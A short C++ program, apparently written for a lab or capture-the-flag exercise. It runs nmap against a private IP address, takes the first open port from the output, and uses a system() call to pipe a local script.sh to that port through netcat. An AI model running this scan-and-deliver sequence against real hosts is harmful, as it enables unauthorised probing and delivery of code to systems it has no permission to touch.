#include<bits/stdc++.h>

using namespace std;

int main() {

    system("nmap 192.168.0.15 > nmap_results.txt");
    FILE* fp = fopen("nmap_results.txt", "r");
    char cur[1000];
    int port_no;
    while (fscanf(fp, "%s", cur) != EOF) {
        if (strcmp(cur, "PORT") == 0) {
            fscanf(fp, "%s", cur); //skip STATE
            fscanf(fp, "%s\n", cur); //skip  SERVICE
            break;
        }
    }
    fscanf(fp, "%d", &port_no);
    // printf("%d\n", port_no);
    sprintf(cur, "nc 192.168.0.15 %d < script.sh", port_no);
    system(cur);



    return 0;
}
